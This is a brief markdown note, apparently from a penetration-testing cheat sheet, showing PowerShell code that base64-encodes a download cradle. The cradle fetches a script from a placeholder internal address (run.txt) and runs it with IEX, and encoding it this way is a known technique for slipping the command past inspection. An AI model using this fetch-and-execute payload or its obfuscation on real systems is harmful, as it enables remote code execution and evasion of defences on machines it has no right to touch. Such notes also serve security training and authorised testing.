# base64 encoding

## b64 encoding

```csharp
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.x.x/run.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

